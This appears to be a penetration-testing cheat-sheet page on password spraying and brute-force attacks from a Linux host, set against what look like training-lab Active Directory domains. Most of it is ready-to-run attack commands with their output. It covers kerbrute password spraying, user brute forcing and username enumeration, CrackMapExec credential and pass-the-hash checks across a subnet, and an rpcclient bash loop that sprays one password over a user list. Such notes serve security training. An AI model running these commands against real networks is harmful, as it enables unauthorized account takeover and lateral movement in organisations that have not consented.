---
description: >-
  This page is for password spraying when we have access to a Linux host inside
  the internal network.
---

# Brute Force / Password Spraying - Linux Tools

***

## Kerbrute

<mark style="color:yellow;">**Kerbrute is a great tool if we don't have a username:password yet**</mark>, but we want to attempt to brute force our way in. We can brute force usernames or passwords... as well as spray a discovered credential.

```
$ ./kerbrute -h

 


Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit
```

### Spray Password

If we discover a credential, we can spray it against known users.

```shell-session
attacker@kali$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds\
```

### Password Brute Force

If we have discovered usernames but no password, we can try to brute force valid credentials.

```shell-session
attacker@kali$ kerbrute bruteuser --dc intelligence.htb -d intelligene.htb /usr/share/wordlists/rockyou.txt William.Lee

   __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88
```



### Username Brute Force

If we don't have anything, we try to find valid kerberos usernames with a usernames wordlist.

```shell-session
attacker@kali$ kerbrute userenum --dc intelligence.htb -d intelligene.htb users.txt

   __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88
```

## CrackMapExec

### Password Spray / Brute Force

We can use crackmapexec to brute force passwords, usernames, and spray when we discover a new credential. It is an invaluable tool to have in our toolbox.

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
</strong>
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
</code></pre>

### **CrackMapExec --local-auth**

<mark style="color:yellow;">**It's important to always test for local windows authentication as well as domain authentication when discovering a password**</mark>

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
</strong>
SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
</code></pre>



## rpcclient

**Using a Bash one-liner for the Attack**

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
